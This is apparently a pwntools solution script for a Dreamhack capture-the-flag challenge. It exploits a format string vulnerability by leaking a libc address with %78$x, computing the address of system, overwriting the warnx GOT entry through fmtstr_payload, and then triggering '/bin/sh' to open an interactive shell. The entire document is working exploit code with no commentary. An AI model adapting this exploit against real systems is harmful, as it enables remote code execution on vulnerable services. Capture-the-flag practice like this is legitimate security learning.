from pwn import *

context.arch='i386'

HOST, PORT = '0.0.0.0', 31337
HOST, PORT = 'host3.dreamhack.games', 14088
r = remote(HOST, PORT)

def inp(data):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', data)
def prnt():
    r.sendlineafter('> ', b'2')

def find():
    for i in range(1, 0x50):
        inp(f'%{i}$x'.encode())
        prnt()
        r.recvuntil(b'string: ')
        res = r.recvline().decode().strip()
        if res == '0':
            continue
        print(i, res)

inp(b'%78$x')
prnt()
r.recvuntil(b'string: ')
libc = int(r.recvline().decode().strip(), 16)-0x1b0000
warnx_got=0x804a02c
system=libc+0x3a950

payload = fmtstr_payload(5, {warnx_got:system})
inp(payload)
prnt()
inp(b'/bin/sh')
prnt()

r.interactive()